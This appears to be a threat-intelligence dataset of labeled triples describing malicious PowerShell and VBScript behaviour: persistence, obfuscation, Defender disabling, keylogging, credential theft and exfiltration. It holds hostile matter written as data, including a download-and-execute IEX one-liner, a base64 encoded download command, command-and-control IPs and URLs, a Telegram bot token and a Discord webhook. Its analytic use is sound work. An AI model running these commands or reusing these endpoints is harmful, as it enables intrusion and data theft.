+scheduled task 'Express'	TASK	Execute	Cotrl.vbs	EXE
+$YHYA	VAR	Have	Base64 string	OBF
+Computer name	PVI	Uploaded	http://51.132.148.124/brume.php	URL
+The script	SUB	Decode	long byte sequence	OBF
+The script	SUB	Connect	3HHHHHHHHHHHHHHHHHHHHH112HHHHHHHHHHHHHHHHHHHHHHH173HHHHHHHHHHHHHHHHHHHHH17/ASSYServerHHHHHHHHHHHHHHHHHHHHHHHtxt	URL
+The script	SUB	Terminate	*powershell*	PROCESS
+The script	SUB	Have	$AQWWVnJxQcAhqzyGgu	CUSTOMIZED PARAMETER
+Invoke method	FUNCTION	Execute	command with byte array	COMMAND WITH DATA
+The script	SUB	Check	certain value in specific memory locations	MEMORY
+Start-Process	Start-Process COMMAND	Have	NoNewWindow	BYPASS PARAMETER
+The script	SUB	Create	C:\ProgramData\TBFLVIISWLYQJRIYEDPLGO	ProgramData PATH
+$XyybdfuQWuefStm	OBF	Decrypted	powershell scripts	PS COMMAND
+The script	SUB	Download	a file	FILE
+http://ozzoeyi/index.php?5964824458645864581	FILE	Hosted	http://ozzoeyi/index.php?5964824458645864581	URL
+The script	SUB	Execute	http://ozzoeyi/index.php?5964824458645864581	FILE
+The script	SUB	Execute	RUCXFGHJUCVOFVUZVIPNCG.ps1	EXE
+The script	SUB	Write	C:\Users\Owner\AppData\Local\Temp\tmpECC8.tmp	FILE
+The script	SUB	Use	RC4 encryption	OBF
+The script	SUB	Execute	Clear-PowerShellHistory	Clear-PowerShellHistory COMMAND
+PowerShell commands	PS COMMAND	Have	-ExecutionPolicy	Bypass PARAMETER
+The script	SUB	Use	AES encryption	OBF
+hidden directory	HIDDEN PATH	Host	multiple executable files	EXE
+script	SUB	Use	Telegram bot token (7252114865:AAGmlQ0WALjwG2UkRQj8B5LSReMBTAMhfQs)	BOT TOKEN
+The script	SUB	Have	base64 encoded string	OBF
+security features	ACTION	Include	Windows Firewall	DEFENDER
+System.Reflection.Assembly	Reflection.Assembly	Load	Assembly from string	EXE
+$xpy	DATA	Loaded	executable memory	MEMORY
+The script	SUB	Terminate	*.bat	PROCESS
+specific key presses	EVENT	Include	Ctrl + X	KEYBOARD EVENT
+Report.ps1	EXE	Decode	LONG_BYTE_SEQUENCE	OBF
+The script	SUB	Delete	*.js	FILE
+The script	SUB	Perform	Code Injection	ACTION
+The script	SUB	Use	-NoE, -NoP, -NonI, -W Hidden	PARAMETER
+The script	SUB	Copy	login data file	FILE
+The script	SUB	Use	encoded strings	OBF
+PowerShell scripts	SUB	Execute	install.vbs	EXE
+an assembly	EXE	Have	EntryPoint	ENTRYPOINT TO EXE
+PowerShell script	SUB	Have	obfuscated hexadecimal strings	OBF
+The script	SUB	Use	WebProxy and Credentials	ACTION
+The script	SUB	Modify	registry key for 'socks'	REGKEY
+The script	SUB	Have	$ZPWeIhCk	OBF
+The script	SUB	Collect	remote server	REMOTE_HOST
+The script	SUB	Use	VBScript for Execution	ACTION
+The script	SUB	Use	bypass script	EXE
+Invoke-Expression	COMMAND	Have	-EncodedCommand	ENCODED PARAMETER
+The script	SUB	Create	MINGALIES	PATH
+Marshal::Copy	WAPI	COPY	$kgjFavhe	OBF
+The script	SUB	Decode	base64-encoded byte sequence	OBF
+Start-Process	COMMAND	Have	-FilePath	C:\Windows\System32\cmd.exe	PATH
+scheduled task	TASK	Execute	log.vbs	EXE
+The script	SUB	Terminate	specific message on Ctrl+Ctrl press	MESSAGE
+$pe	VAR	Generated From	$YHYA	VAR
+The script	SUB	Connect	62.182.158.156:6666	IP
+The script	SUB	Use	Send-DiscordMessage function	Function
+The script	SUB	Read/Write	files	FILE
+The script	SUB	Obfuscate	Strings and variables	OBF
+The script	SUB	Decodes	Base64 string	DATA
+The script	SUB	Have	obfuscated strings and variables	OBF
+The script	SUB	Create	.lnk file	FILE
+Base64 string	OBF	Have	Encoded Command	COMMAND
+The script	SUB	Create	MEMEMAN directory	PATH
+Encoded Command	COMMAND	Execute	PowerShell	PS COMMAND
+The script	SUB	Use	.vbs extension	FILE
+WD.bat	EXE	Execute	PowerShell scripts	PS COMMAND
+powershell.exe	PS PS COMMAND	Have	-NoProfile -ExecutionPolicy Bypass	BYPASS PARAMETER
+The script	SUB	Execute	malicious code	EXE
+The script	SUB	Set	$ErrorActionPreference	PARAMETER
+KeyLogger	WAPI	Check	log every keystroke	PVI
+The script	SUB	Monitor	Ctrl + X	ACTION
+PowerShell script	SUB	Use	System.Management	System.Management NAMESPACE
+The script	SUB	Create	delegate to execute code	DELEGATE
+script	SUB	Invoke	delegate for VirtualAlloc	DELEGATE
+code within the assembly	ASSEMBLY	Call	main function from SharpPrintNightmare.Program	FUNCTION
+The script	SUB	Execute	YWGCNHBTTYGDVSHYYNDAIO.ps1	EXE
+The script	SUB	Change	Registry	REGKEY
+The script	SUB	Execute	start-sleep	SLEEP
+The script	SUB	Allocate	memory location	MEMORY
+scheduled task	ACTION	Execute	VBScript file (BT.vbs)	EXECUTE
+The script	SUB	Download	a base64 encoded data	OBF
+notepad.exe	EXE	Overwrites	legitimate system file	FILE
+script	SUB	Create	scheduled task (TvMusic2)	TASK
+The script	SUB	Create	sqmapi.vbs in C:\ProgramData\WindowsHost\	FILE
+The script	SUB	Extract	zip file	COMPRESSED FILE
+The script	SUB	Write	VBScript file (BT.vbs)	EXE
+The script	SUB	Have	Encoded Script	OBF
+A downloaded file	EXE	Downloaded	a remote location (Discord CDN link)	URL
+qgame_tim and qqgame_gg functions	FUNCTION	Use	decoded byte array	DATA
+scheduled task (TvMusic2)	TASK	Execute	TvMusic.vbs	EXE
+Base64 string	OBF	Contain	Invoke-WebRequest	Invoke-WebRequest COMMAND
+The script	SUB	Have	WindowsBase and PresentationCore .NET assemblies	NET ASSEMBLY
+The script	SUB	Create	$uzLJuErm	CUSTOMIZED PATH
+The script	SUB	Have	-enc	PARAMETER
+The script	SUB	Have	hexadecimal byte arrays	OBF
+The script	SUB	Set	persistence cookie	PROPERTY
+Invoke-Expression	COMMAND	Have	-EncodedCommand	EncodedCommand PARAMETER
+The script	SUB	Create	BT.vbs	EXE
+The script	SUB	Load	aspnet_regbrowsers.exe	EXE
+The script	SUB	Set	run client32.exe on startup	ACTION
+The script	SUB	Check	user's keyboard	PVI
+The script	SUB	Execute	Get-LocalUser	COMMAND
+Invoke-Expression	COMMAND	Have	-ExecutionPolicy Bypass	PARAMETER
+The script	SUB	EXECUTE	remote code	COMMAND
+The script	SUB	Wait	thread to finish	LOOP
+rundll32.exe	EXE	Load	33667344.dll	DLL
+system information	PVI	Include	geolocation data	PVI
+The script	SUB	Access	$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data	PATH
+The script	SUB	Use	VirtualAlloc	WAPI
+The script	SUB	Connect	hoteghnew.blogspot.com////////////////////////////atom.xml	URL
+PowerShell	PS COMMAND	Have	in a hidden window	HIDE
+$y74gh00rffd	OBF	Have	Base64 Encoding	ACTION
+The script	SUB	Create	tmpD994.tmp	FILE
+The script	SUB	Write	VBScript file (Document.vbs)	EXE
+The script	SUB	Execute	/login/process.php	WEB QUEST
+VBScript	EXE	Use	WScript.Shell object	COMMAND
+registry key for 'socks'	REGKEY	SetTo	AutoRun	AUTORUN
+The script	SUB	Invoke	Telegram API	Telegram API
+The script	SUB	Check	Ctrl + Ctrl key press	KEYBOARD EVENT
+PowerShell	PS COMMAND	Have	-ExecutionPolicy Bypass -Scope Process -Force	BYPASS PARAMETER
+The script	SUB	Upload	Dropbox account	EXTERNAL SERVICE
+The script	SUB	Wait	every 15 seconds	TIME
+The script	SUB	Execute	r.exe	EXE
+remote script	EXE	Hosted	hxxp://example.com/script3.ps1	URL
+The script	SUB	React	Ctrl + Ctrl	ACTION
+The script	SUB	Execute	file.exe	EXE
+The script	SUB	Decrypt	ProtectedData class	DATA
+The script	SUB	Execute	start "C:\Users\Public\Music\install.vbs"	EXE
+the script	SUB	Check	PowerShell version < 2	Powershell VERSION
+The script	SUB	ADD REFERENCE TO	System.Drawing.dll	FILE
+PowerShell script	PS COMMAND	Execute	.NET assembly from byte array	NET ASSEMBLY
+The script	SUB	Create	New Thread	THREAD
+The script	SUB	Executes	code in allocated memory	CODE
+code in allocated memory	CODE	Loaded	allocated memory	MEMORY
+The script	SUB	Use	AES	ENCRYPTION ALGORITHM
+The script	SUB	Collect	geographical location	PVI
+'Run.vbs'	EXE	Saved	'C:\Users\Public\Run'	PATH
+The script	SUB	Create	'YWGCNHBTTYGDVSHYYNDAIO.ps1'	EXE
+XX.bat	EXE	Use	-ExecutionPolicy Bypass	BYPASS PARAMETER
+The script	SUB	Have	Base64 encoded strings	OBF
+The script	SUB	Collect	operating system version	PVI
+'adobe.zip'	COMPRESSED FILE	Downloaded From	178.62.96.159	IP ADDRESS
+The script	SUB	Use	VirtualAlloc	WAPI
+new thread	THREAD	Execute	$MHilluFsD	PAYLOAD
+The script	SUB	Have	-win hid	BYPASS PARAMETER
+The script	SUB	Connect	hardcoded server IP address	IP ADDRESS
+The script	SUB	Use	WaitForSingleObject	WaitForSingleObject WAPI
+The script	SUB	Create	directory in C:\ProgramData\WD	ProgramData PATH
+The script	SUB	Download	20200510.rar	COMPRESSED FILE
+The script	SUB	Connect	https://discord.com/api/webhooks/1283930910772957224/R3XHJxVUKh-r3ecRq9or29O3EkiHhFu4jHsfPK6ezDzIN7tW4Pkv_zCNy8Sn2Df-04ak	URL
+The script	SUB	Change Directory	user's AppData folder	USER APPDATA PATH
+rNTw8v4l	KEY	ReferTo	TravellingPositions_nopump.exe	EXE
+If the address of the exception matches the address of the function 'Ascanner'	MEMORY_ADDRESS_MATCH	Execute	"handler"	FUNCTION
+The script	SUB	Execute	Unknown PE	EXE
+The script	SUB	Create	install.ps1	EXE
+clipboard data	PVI	SentTo	remote server	REMOTE HOST
+The script	SUB	Have	sleep intervals	SLEEP
+new thread	THREAD	Execute	x86 assembly code in memory	CODE
+The script	SUB	Execute	-WindowStyle hidden	BYPASS PARAMETER
+The script	SUB	Execute	Dropbox API	ACTION
+The script	SUB	Loop	infinite loop	LOOP
+keylogger	COMMAND	Collect	key presses	PVI
+README.txt	FILE	Hosted	user's desktop	PATH
+VirtualAlloc	WAPI	Create	memory space	MEMORY
+.BAT file	EXE	Hosted	C:\Users\Public\Run	PATH
+PowerShell process	PROCESS	Have	suppressed error dialogs	suppressed error dialogs
+shellcode	OBF	Copied into	allocated memory	MEMORY
+GoogleUpdate.ps1	EXE	Hosted	https://invitadoscarlsjr.mx/.POP/.B.jpg	URL
+The script	SUB	Connect	http://hpsj.firewall-gateway.net:80/	URL
+The script	SUB	Contact	attacker's email address	URL
+The script	SUB	Connect	50.62.182.1	URL
+The script	SUB	Save	CorSym.ps1	EXE
+The script	SUB	Connect	http://smart.com-coffee.click/trash/bone/show.php	URL
+The script	SUB	Inject	RegSvcs.exe	PROCESS
+The script	SUB	Use	$RecentGranita	PARAMETER
+The script	SUB	Executes	Sleep 5	SLEEP
+The script	SUB	Read	ReadToEnd	WAPI
+The script	SUB	Create	batch file (JJVXCDAUCHAIHBIEPXDBCS.bat)	EXE
+ZIP archive	FILE	UploadedTo	Dropbox	EXTERNAL SERVICE
+The script	SUB	Use	XOR Encryption	FUNCTION
+[ab821408b424418fa94bb4d815b4e.ad0682a943e4859ef35309cc0a537]	NAMESPACE	Have	True	RANDNAME
+The script	SUB	Create	1.bat	EXE
+Modify a registry	Action	Disable	AMSI	DEFENDER
+The script	SUB	Create	XX.bat	EXE
+batch script	EXE	Execute	JZKPPKGTHBOIPSRKOCOKSH.ps1	EXE
+VBScript file at C:\Users\Public\Smart.vbs	EXE	Have	obfuscated content	OBF
+The script	SUB	Load as Assembly	modified file	FILE
+custom encryption function	OBF	Called	DOf3ghXcVf	FUNCTION
+Reflective DLL Injection	DLL INJECTION	Have	VirtualAlloc	WAPI
+The script	SUB	Execute	XX.bat	EXE
+The script	SUB	Execute	VBScript	EXE
+The script	SUB	Execute	the downloaded file	EXE
+The script	SUB	Monitor	Ctrl + c or Ctrl + x key press	EVENT
+Decrypted payload	DATA	CopiedTo	the allocated memory by VirtualAlloc	MEMORY
+VirtualAlloc	WAPI	Create	memory	MEMORY
+The script	SUB	Access	Windows\Micr	SYSTEM PATH
+Persistent Connection	ACTION	Allows	Receive and Execute Commands	ACTION
+The script	SUB	Create	C:\Users\Public\Run\New.vbs	PATH
+The script	SUB	Hide	javae.exe	PROCESS
+decoded string	DATA	Use	Add-Type	-TypeDefinition	DYNAMIC COMPILE
+payload	DATA	Into	running process	PROCESS
+The script	SUB	Check	the decrypted data starts with the Unicode Byte Order Mark (BOM)	DATA starts with the Unicode Byte Order Mark (BOM)
+The script	SUB	Execute	a downloaded file	EXE
+The script	SUB	Connect	'http://3HHHHHHHHHHHHHHHHHHHHH112HHHHHHHHHHHHHHHHHHHHH173HHHHHHHHHHHHHHHHHHHHH17/ASYYServerHHHHHHHHHHHHHHHHHHHHHtxt'	URL
+The script	SUB	Execute	powershell scripts	EXE
+The script	SUB	Download	http://85.192.63.184/s.exe	EXE
+remote commands	COMMAND	Have	Invoke-Expression	COMMAND
+The script	SUB	Execute	YWGCNHBTTYGDVSHYYNDAIO.vbs	EXE
+The script	SUB	Create	Run.vbs	EXE
+The script	SUB	Decrypt	p9d2s.exe	EXE
+PowerShell script	PS COMMAND	Execute	hidden window	BYPASS PARAMETER
+The script	SUB	Use	Base64 Encoding and Decoding	METHOD
+The script	SUB	Execute	TvMusic.vbs	EXE
+The script	SUB	Collect	username	PVI
+Start-Process cmdlet	COMMAND	Execute	Processes	PROCESS
+$.ReadToEnd()	COMMAND	Indicates	reading exfiltrated data	ACTION
+The script	SUB	Download	config.json	FILE
+scheduled task "Data"	TASK	Execute	install.vbs	EXE
+The script	SUB	Use	void operator	OBF
+The script	SUB	Execute	InstallUtil.exe	COMMAND
+The script	SUB	Send	the same unknown URL	URL
+The script	SUB	Write	log.vbs	EXE
+PowerShell script	SUB	Use	System.IO.Compression.GzipStream	COMPRESSION API
+arguments	PARAMETER	ReferTo	jsc.exe	COMMAND
+The script	SUB	Have	-EP bypass	BYPASS PARAMETER
+script	SUB	Have	$JFmAXPFHnGfI	OBF
+The script	SUB	Connect	http://45.89.125.189/put	URL
+The script	SUB	Connect	45.82.69.203:443	IP
+The script	SUB	Encode	$GSZDYabcRPKLoT	OBF
+The script	SUB	Reference	System.Windows.Forms	Windows FORM LIBRARY
+registry key	REGKEY	Is	HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\<random_string>	KEYVALUE
+install.ps1	EXE	Hosted	user's AppData\Roaming\Logs folder	PATH
+The script	SUB	Execute	loop through browser paths	LOOP
+The script	SUB	Execute	VBoxSVC.exe	EXE
+The script	SUB	Have	$hook	OBF
+The script	SUB	Encrypt	payloads in install.vbs	OBF
+The script	SUB	Use	custom encryption algorithm	ALGORITHM
+delegate	ENTITY	Used for	execute code	ACTION
+The script	SUB	Execute	Isass.exe	EXE
+The script	SUB	Download	garold.zip	ZIPPED FILE
+The script	SUB	Have	obfuscation techniques	OBF
+The script	SUB	Access	HKCU:\Software\Microsoft\Windows\CurrentVersion\Run	REGKEY
+system information	PVI	Include	computer name	PVI
+Run.BAT	FILE	Have	command to download and run another file	COMMAND
+The script	SUB	Collect	Distributed COM users	PVI
+The script	SUB	Execute	Start-Job	COMMAND
+BT.vbs	EXE	Write	disk	PATH
+scheduled task	TASK	Execute every	3 minutes	FREQUENCY
+The script	SUB	Use	Sleep function	SLEEP
+QJAMsrpfhk	NAMESPACE	Have	HH	CLASS
+The script	SUB	Have	-WindowStyle Hidden	BYPASS PARAMETER
+The script	SUB	Disable	certain Windows Defender exclusions	DEFENDER
+The script	SUB	Kill	PowerShell process	PROCESS
+PowerShell command	PS COMMAND	Execute	downloaded file	EXE
+The script	SUB	Collect	system information	PVI
+The script	SUB	Write	$outputFile	FILE
+Loader.vbs	EXE	Execute	PowerShell commands	PS COMMAND
+The script	SUB	Execute	Start-Sleep	SLEEP
+RUCXFGHJUCVOFVUZVIPNCG.ps1	EXE	Decrypt and Execute	payload	DECRYPT
+The script	SUB	Save	clipboard data	PVI
+Multiple Executions	ACTION	Execute	Invoke-Expression	COMMAND
+The script	SUB	Download	a remote file	FILE
+The script	SUB	Use	Obfuscated Strings	OBF
+The script	SUB	Execute	helper2.exe	EXE
+The script	SUB	Execute	string with PowerShell script	PS COMMAND
+The script	SUB	Collect	Computer's name	PVI
+AutoIt3.exe	EXE	Have	-a script.a3x	PARAMETER
+Get-Process	COMMAND	Check	firefox.exe	PROCESS
+The script	SUB	OBF	Base64 encoding	OBF
+System information	PVI	Includes	Installed software list	FILE
+The script	SUB	Have	1000 milliseconds	SLEEP
+VirtualAlloc	WAPI	Allocate	executable memory	MEMORY
+The script	SUB	EXECUTE	upd.exe	EXE
+The script	SUB	Use	GetProcAddress	WAPI
+PowerShell command	PS COMMAND	Download	GoogleUpdate.ps1	EXE
+The script	SUB	Create	C:\Users\Public\Run\New.vbs	EXE
+C:\Users\Public\Run\New.vbs	EXE	Execute	PowerShell command	PS COMMAND
+The script	SUB	Maintain	persistence	ACTION
+The script	SUB	Have	while ($true) {...}	LOOP
+C# code	CODE	Use	kernel32.dll functions	WAPI
+The script	SUB	Combine	-join operator	ACTION
+Web server	Server	Listen	Incoming connections	ACTION
+function 'IGEUWHBKBY'	FUNCTION	Performs	decryption	ACTION
+The script	SUB	Disable	Windows Defender Real-Time Protection	DEFENDER
+Win32Functions	NAMESPACE	Have	VirtualAlloc	WAPI
+PowerShell scripts	SUB	Execute	Loader.vbs	EXE
+loop	LOOP	Collect	active window titles	PVI
+The script	SUB	Check	strings in the BIOS and GPU information with a list of known virtual machine signatures	VM_SIGNATURE
+The script	SUB	Connect	173.247.239.186	IP
+Ctrl + c or Ctrl + x key press	EVENT	Trigger	dischat function	FUNCTION
+HB function	FUNCTION	Use	Encode and Decode	OBF
+decoded data	DATA	Write	agreeBrood.jpg	FILE
+The script	SUB	Download	http://20.91.206.86/64bits.php	URL
+Invoke-Expression	IEX COMMAND	Combined	files with random names	FILE WITH RANDOM NAME
+The script	SUB	Execute	Sleep command	SLEEP
+The script	SUB	Have	hexadecimal sequences	OBF
+The script	SUB	Execute	Base64 decoded payload	OBF
+The script	SUB	Delete	README.txt	FILE
+The script	SUB	Access	$env:COMPUTERNAME	ENV PARAMETER
+The script	SUB	Create	PasswordVault instance	Instance
+The script	SUB	Check Existence	antivirus software executables	DEFENDER
+The script	SUB	Create	Batch File	FILE
+The script	SUB	Disable	Controlled Folder Access (CFA)	DEFENDER
+The script	SUB	Delete	All .lnk files	FILE
+Sleep and retry mechanism	SLEEP	Wait	8 seconds	TIME
+The script	SUB	Have	Microsoft.VisualBasic	NAMESPACE
+delegate zV2s3	FUNCTION	Call	CreateThread	WAPI
+The script	SUB	Manipulate	Environment Variables	VARIABLE
+The script	SUB	Add	current username	PVI
+LONG_BYTE_SEQUENCE	DATA	ChangedTo	URLs	URL
+The script	SUB	Write	mezzanines.dll	DLL
+func_get_proc_address	FUNCTION	Get	ADDRESS of process	ADDRESS OF PROCESS
+The script	SUB	Use	PowerShell	EXE
+system information	PVI	Includes	IP address	PVI
+WKDXIRNNHFHKNAFGOARGSL.bat	EXE	Execute	WKDXIRNNHFHKNAFGOARGSL.ps1	EXE
+The script	SUB	Execute	TBFLVIISWLYQJRIYEDPLGO.vbs	EXE
+The script	SUB	Communicate	remote server	EXTERNAL SERVICE
+The script	SUB	Have	$book	OBF
+The script	SUB	Execute	web request	COMMAND
+long byte sequence	OBF	Hosted	The script	SUB
+The script	SUB	Add Exclusion	registry key	REGKEY
+$UJDSS	VAR	Have	Base64 string	OBF
+The script	SUB	Create	PDF.vbs	EXE
+scheduled task	TASK	Execute	every 2 minutes	PERIOD
+Loader.vbs	EXE	Hosted	user's AppData\Roaming\Logs folder	PATH
+decrypted byte sequence	DATA	Loaded	allocated memory	MEMORY
+Base64 string	ACTION	Decrypted With	XOR operation (-bxor 35)	COMMAND
+$JYeIcaeGeKUCI	OBF	Have	potential shellcode	COMMAND
+The script	SUB	Use	Start-Sleep commands	SLEEP
+The script	SUB	Write	Loader.vbs	EXE
+The script	SUB	Check	PowerShell version >= 5.1	PowerShell version
+The script	SUB	Download	https://upds.azureedge.net/update.zip?cn={$env:computername}	COMPRESSED FILE
+byte array	OBF	Have	x86 assembly code	CODE
+The script	SUB	Connect	https://meet.g...gle.com/	URL
+executable memory	MEMORY	Have	0x40 (PAGE_EXECUTE_READWRITE)	ATTRIBUTE
+The script	SUB	Delete	The script	SUB
+The script	SUB	Place	xx.bat	FILE
+The script	SUB	Have	try-catch block	ERR
+decoded byte sequence	DATA	Loaded	memory	MEMORY
+The script	SUB	Use	IO.Compression.DecompressStream	Method
+The script	SUB	Write	.vbs files	EXE
+The script	SUB	Send	recovery key	URL
+The script	SUB	Upload	stolen files	PVI
+The script	SUB	CHANGE	file's execution policy	EXECUTION POLICY
+The script	SUB	Execute	Set-MpPreference	COMMAND
+dynamic assemblies	ASSEMBLY	Use	DefineDynamicAssembly	FUNCTION
+The script	SUB	Enumerate	computer names or IP addresses	PVI
+kernel32.dll	LIBRARY	Provides	VirtualAlloc	WAPI
+The script	SUB	Define	"Program"	CLASS
+iex $text	COMMAND	Execute	remote code	CODE
+The script	SUB	Create	a temporary file	EXE
+The script	SUB	Change	system's wallpaper	SETTING
+The script	SUB	Use	Base64 Encoding and Decoding	OBF
+script	SUB	Execute	dynamic .NET type	EXE
+PowerShell ISE shortcut	PATH	LocatedIn	user's startup folder	PATH
+The script	SUB	Allocates	memory	MEMORY
+The script	SUB	Execute	Get-WmiObject	COMMAND
+The script	SUB	Decompress	Base64 string	DATA
+powershell.exe -c (new-object net.webclient).downloadstring('http://10.0.0.1/share/update.exe') | IEX	PS COMMAND	Execute	Invoke-Expression	COMMAND
+powershell.exe -c (new-object net.webclient).downloadstring('http://10.0.0.1/share/update.exe') | IEX	PS COMMAND	Download	update.exe	EXE
+The script	SUB	Communicate	archive.soundcast.me:191	URL
+PasswordVault instance	Instance	Execute	RetrieveAll()	Function
+The script	SUB	Have	Encoded Command	OBF
+ADExtract	CODE	Collect	Collected system information	PVI
+The script	SUB	Connect	156.96.62.54:4001	IP
+The script	SUB	Executes	code at allocated memory address	CODE
+The script	SUB	Copy	shellcode	OBF
+DATA	DATA	WrittenTo	marqueesInvariance.txt	FILE
+The script	SUB	Define	UDXTFLCBTPDTCSEPOVHLIZ	FUNCTION
+EPzLaSUIf.bin	FILE	Saved	%temp%	TEMP PATH
+The script	SUB	Create Registry Key	ONEN0TEupdate	REGKEY
+The script	SUB	Have	String Concatenation	ACTION
+The script	SUB	Connect	http://ozzoeyi	URL
+The script	SUB	Collect	browser login data	PVI
+YWGCNHBTTYGDVSHYYNDAIO.bat	EXE	Created By	The script	SUB
+Decompressed data	DATA	Loaded	memory	MEMORY
+The script	SUB	Use	kernel32 functions	WAPI
+iex	COMMAND	Have	Invoke-Expression	PARAMETER
+The script	SUB	Create	Add.ps1	EXE
+The script	SUB	Check	the size of IntPtr	SIZE OF POINTER
+install.ps1	EXE	Hosted	C:\Users\Public\Music	PATH
+The script	SUB	Create	hidden directory (C:\ProgramData\Express)	PATH
+The script	SUB	Write	result\Disk.csv	FILE
+The script	SUB	Disable	PUA Protection	DEFENDER
+user's clipboard	PVI	SentTo	Discord webhook	EXTERNAL SERVICE
+Powershell	PS COMMAND	Have	-WIND HIDDEN	BYPASS PARAMETER
+The script	SUB	Creates	delegate	ENTITY
+dhpS7mQW0xTdFRyQ9wcpnOavwO5mraDdYaNVq883wdR911kpOd1AsVvZGtVSQ43qtfO5Db0AYIsJwA343g7OIClBeoQwLPN2K1fl	FUNCTION	Use	AES Decryption	DESCRYPTION TOOL
+The script	SUB	Delete	Sexology.~!!!!!!!!!!!!!!!!~	FILE
+The script	SUB	Define	VirtualAlloc	WAPI
+The script	SUB	Use	IEX	COMMAND
+The script	SUB	Execute	email attachment	FILE
+The script	SUB	Create	files	FILE
+kernel32.dll	LIBRARY	Have	CreateThread	WAPI
+Facexbook.exbxexb	FILE	Hosted	htn8v6pprexbssplayy.com	URL
+powershell.exe	PS COMMAND	Have	-EX byPAss -NoP -w 1 -EC IAAJAFsATgBlAHQALgBTAGUAcgBWAGkAYwBFAHAATwBpAG4AdABtAEEATgBBAEcAZQBSAF0AOgA6AHMARQBDAFUAUgBJAHQAWQBwAFIAbwB0AG8AQwBvAGwAIAAJAD0AIAAJAFsAbgBFAFQALgBTAEUAQwBVAHIASQBUAFkAUAByAG8AVABPAGMATwBsAFQAeQBwAEUAXQA6ADoAVABsAHMAMQAyACAACQA7ACAAIAAgAEkAUgBNACAALQBVAHIASQAgAAkAKAAdIGgAdAB0AHAAOgAvAC8AbwB6AHoAeQAdICAACQAgAAkAKwAgAAkAHSBpAG4AZwBpAGwAHSAgAAkAIAAJACsAIAAJAB0gaQB6AGMAZQAuAGMAbwBtAC8AdwBwAC0AYwBvAG4AdABlAG4AdAAvAHMAZwB1AC8AHSAgAAkAIAAJACsAIAAJAB0gMAA1ADkANgA0ADgAMgA0ADQANQA4ADYANAA1ADEAMAAdICAACQAgAAkAKwAgAAkAHSAuAGUAeABlAB0gIAAJACkAIAAJAC0AbwBVAHQARgBJAGwARQAgACAAHSAkAGUAbgB2ADoAVQBTAEUAUgBwAHIATwBGAEkAbABFAFwAdQBwAGQAYQB0AC4AZQB4AGUAHSAgAAkAOwAgAGkAbgBWAE8ASwBlAC0AaQBUAGUATQAgAB0gJABlAE4AVgA6AHUAcwBFAFIAcAByAE8ARgBJAEwARQBcAHUAcABkAGEAdAAuAGUAeABlAB0g	OBF
+The script	SUB	Check	Ledger Live folder	PATH
+Ctrl + C or Ctrl + X key press	EVENT	Trigger	dischat function call	ACTION
+Robocopy	COMMAND	Copy	files	FILE
+system information	PVI	Includes	current directory path	PVI
+The script	SUB	Have	obfuscated byte array aiYLcwaq	OBF
+The script	SUB	Create	Multiple files	FILE
+The script	SUB	Collect	user's AppData folder	PVI
+The script	SUB	Write	log.ps1	EXE
+The script	SUB	Execute	System.Net.WebClient	WebClient
+The script	SUB	Perform	stealthy operations	ACTION
+script	SUB	Connect	remote server	URL
+The script	SUB	Execute	string concatenation	ACTION
+The script	SUB	Create	C:\ProgramData\tneg	PATH
+The script	SUB	Retrieve	the address of VirtualAlloc	MEMORY
+Decrypted command	COMMAND	Contains	**LONG_BYTE_SEQUENCE**	PARAMETER
+The script	SUB	Connect	185.225.74.198:4488	IP
+Run.vbs	EXE	Hosted	C:\Users\Public\Run\	PATH
+The script	SUB	Allocate	Memory	MEMORY
+PowerShell	PS COMMAND	Use	/C	PARAMETER
+scheduled task	TASK	SetTo	run decoded string	COMMAND
+The script	SUB	Use	amsi.dll	DLL
+The script	SUB	Delete	.lnk files	LINK FILE
+The script	SUB	Execute	Start-Sleep 6	SLEEP
+copied files and the screenshot	ZIPPED FILE	Send To	Telegram bot	BOT
+System.Reflection.Assembly	WAPI	Use	$RNP and $MyS	PARAMETER
+The script	SUB	Have	Error Handling	ERR
+proof-of-concept exploit	EXPLOIT	Use	CVE-2021-34527	VULNERABILITY
+The script	SUB	Calls	function 'IGEUWHBKBY'	FUNCTION
+The script	SUB	Connect	199.168.100.74	IP
+aspnet_regbrowsers.exe	EXE	Locate	C:\Win\icros\framework\v4.0.30319	PATH
+rundll32	EXE	Execute	'marqueesInvariance.txt'	FILE
+The script	SUB	Use	CreateThread	WAPI
+The script	SUB	Create	QPXCNKQPGRJWIWPIQLPDOP.bat	EXE
+The script	SUB	Create	delegate zV2s3	DELEGATE
+The script	SUB	Create	Run.BAT	EXE
+The script	SUB	Download	'server.exe'	EXE
+The script	SUB	ADD REFERENCE TO	System.Web.Extensions.dll	EXE
+The script	SUB	Execute	[System.Reflection.Assembly]::Load()	Reflection.Assembly::Load WAPI
+The script	SUB	Use	Hardware breakpoints	BREAKPOINT
+The script	SUB	Disable	MAPS Reporting	DEFENDER
+The script	SUB	Have	registry auto-run entry	AutoRun RegKey	
+a long byte sequence	DATA	ConvertedTo	characters	DATA
+The script	SUB	Dencrypt	Base64 encoded strings	OBF
+The script	SUB	Encrypt	LONG_BYTE_SEQUENCE	OBF
+email with keylogger results	PVI	Connect	srsmsb01@gmail.com	URL
+The script	SUB	Have	Base64	OBF
+text file	FILE	Have	MAC addresses	PVI
+The script	SUB	Load	GetProcAddress	WAPI
+The script	SUB	Save	a file	FILE
+The script	SUB	Use	hidden window	BYPASS PARAMETER
+text file	FILE	Contain	public IP	PVI
+The script	SUB	Create	files and folders	PATH
+The script	SUB	Execute	Get-Clipboard	WAPI
+file with random name	FILE	Have	base64 encoded string	OBF
+a scheduled task	TASK	Execut	start	AutoRun
+The script	SUB	Modify	File content	DATA
+The script	SUB	Contain	large base64-encoded string	OBF
+The script	SUB	Modify	HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run	AutoRun REGKEY
+.NET assembly	NET ASSEMBLY	Execute	a method	FUNCTION
+The script	SUB	Use	random sleep intervals	SLEEP
+The script	SUB	Write	large string	DATA
+text file	FILE	Contain	local IPs	PVI
+The script	SUB	Delete	itself	EXE
+The script	SUB	Create	WKDXIRNNHFHKNAFGOARGSL.bat	EXE
+main.php	FILE	Saved	'leUafP.dat'	DATA
+Report.ps1	EXE	Have	base64 encoded strings	OBF
+This script	SUB	Use	DefineDynamicModule	CODE GENERATION AT RUNTIME
+The script	SUB	Create	'XboxGameBar' directory	PATH
+The script	SUB	Have	long byte sequence	OBF
+powershell files	EXE	Saved	C:\Users\Public\Music	USER PUBLIC PATH
+The script	SUB	Use	.NET reflection	NET REFLECTION WAPI
